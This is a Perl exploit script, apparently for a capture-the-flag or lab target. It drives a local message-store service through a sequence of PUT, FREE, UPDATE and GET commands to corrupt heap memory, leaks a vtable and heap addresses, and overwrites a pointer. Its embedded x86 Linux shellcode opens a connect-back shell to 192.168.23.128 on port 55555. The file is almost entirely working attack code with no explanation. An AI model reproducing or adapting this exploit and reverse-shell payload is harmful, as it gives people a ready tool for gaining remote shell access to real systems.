#!/usr/bin/perl -w

use IO::Socket;

my $buf;
my $sock = IO::Socket::INET->new("127.0.0.1:5555") or die $@;
$sock->autoflush(1);

my $sc = "\x68".
"\xC0\xA8\x17\x80".  # 192.168.23.128
"\x5e\x66\x68".
"\xd9\x03".          # 55555
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce";

print $sock "PUT\n";
print $sock "id01\n";
print $sock "AAAA\n";

print $sock "FREE\n";
print $sock "id01\n";

print $sock "PUT\n";
print $sock "id02"x4 . "\n";
print $sock "B"x16 . "\n";

print $sock "PUT\n";
print $sock "id03"x4 . "\n";
print $sock "C"x16 . "\n";

print $sock "PUT\n";
print $sock "id04\n";
print $sock "DDDD\n";

print $sock "FREE\n";
print $sock "id04\n";

print $sock "PUT\n";
print $sock "id04" . "\n";
print $sock "D"x16 . "\n";

print $sock "PUT\n";
print $sock "id05"x4 . "\n";
print $sock $sc . "\n";

print $sock "UPDATE\n";
print $sock "id02"x4 . "\n";
print $sock "A"x52 . "\xB0" . "\n";

my $v_table;
my $size;
my $str_addr;
my $id_addr;
print $sock "GET\n";
print $sock "id03"x4 . "\n";
# skip
read($sock,$buf, 16*8);

# vtable
read($sock, $v_table, 4);
$v_table = unpack("L", $v_table);
printf "Virtual table:\t%x\n", $v_table;

# size str
read($sock, $size, 4);
$size = unpack("L", $size);
printf "Size str:\t%x\n", $size;

# str
read($sock, $str_addr, 4);
$str_addr = unpack("L", $str_addr);
printf "Str address:\t%x\n", $str_addr;

# id
read($sock, $id_addr, 4);
$id_addr = unpack("L", $id_addr);
printf "Id address:\t%x\n", $id_addr;

print $sock "UPDATE\n";
print $sock "id04\n";
print $sock "E"x24 . pack("L", $str_addr - 0x18) . "\x48" . "\n";

# open shell
print $sock "UPDATE\n";
print $sock "id05"x4 . "\n";
print $sock "shell execute!!!\n";

# _Z16TInsertListEntryPKcS0_
# 0x08048d3d - end

# table
# 0x080491c8

# update
# _ZN8TMessage6UpdateEPKc
# 0x080490D6 - start
# 0x080490f3 - end

# free
# _ZN8TMessageD2Ev